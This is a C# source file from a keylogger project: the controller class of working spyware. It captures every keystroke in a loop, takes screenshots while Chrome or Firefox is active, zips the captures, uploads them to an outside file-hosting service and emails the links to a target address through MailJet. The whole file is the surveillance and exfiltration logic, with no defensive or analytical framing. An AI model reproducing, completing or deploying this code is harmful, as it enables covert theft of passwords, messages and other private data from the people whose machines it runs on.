using Keylogger.Mail;
using Keylogger.Upload;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Input;

namespace Keylogger
{
    public class Controller
    {
        // Processes names or empty if we want to make screenshots all the time
        private HashSet<string> TrackedProcesses = new HashSet<string>(new string[]
        {
            "chrome",
            "firefox"
        });
        private readonly int ImageSnapshotInterval = 3000;
        private readonly int UploadMinInterval = 30000;
        private readonly int MaxUploadSizeMB = 10;
        private readonly IOnlineService[] OnlineServices = new IOnlineService[]
        {
            new ExpireBox()
        };
        private readonly string MailJetPublicKey = "";
        private readonly string MailJetPrivateKey = "";
        private readonly IMailProvider Mailprovider;
        private readonly string TargetMail = "mail@example.com";




        public Controller()
        {
            Mailprovider = new MailJet(MailJetPublicKey, MailJetPrivateKey);
        }




        public void StartMonitor()
        {
            DataSource dataSource = new DataSource();
            LocalStorage localStorage = new LocalStorage(MaxUploadSizeMB);

            int milisecondsSlept = 0;
            while (true)
            {
                // Process keys
                List<Key> pressedKeys = dataSource.GetNewPressedKeys();
                if (pressedKeys.Any())
                    localStorage.SaveKeys(pressedKeys);

                // Process images - but not every milisecond
                if (milisecondsSlept % ImageSnapshotInterval == 0)
                {
                    // We dont'want to track specified process - make a capture
                    if (!TrackedProcesses.Any())
                        localStorage.SaveScreenSnapshot(dataSource.GetScreenSnapshot());
                    else
                    {
                        // Save scren snapshot only when window with tracked process is active
                        string activeProcessName = dataSource.GetActiveWindowProcessName().ToLower();
                        if (TrackedProcesses.Contains(activeProcessName))
                            localStorage.SaveScreenSnapshot(dataSource.GetScreenSnapshot());
                    }
                }

                // Upload if needed
                if (milisecondsSlept % UploadMinInterval == 0 && localStorage.IsFull() && InternetWorks())
                {
                    // Generate ZIP file
                    string zipFile = localStorage.PackToZip();

                    // Upload to all online services
                    List<string> urls = new List<string>();
                    foreach (IOnlineService onlineService in OnlineServices)
                        urls.Add(onlineService.Upload(zipFile));

                    // Clear local storage
                    localStorage.Clear();

                    // Send mail with URLs
                    Mailprovider.SendMail(TargetMail, "KeyLogger", String.Join("\r\n", urls));
                }

                // Sleep
                Thread.Sleep(1);

                // Prevent integer overflow
                milisecondsSlept = ++milisecondsSlept % 1000000;
            }
        }




        private bool InternetWorks()
        {
            try
            {
                using (WebClient wc = new WebClient())
                    wc.DownloadString("https://www.google.cz/");

                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
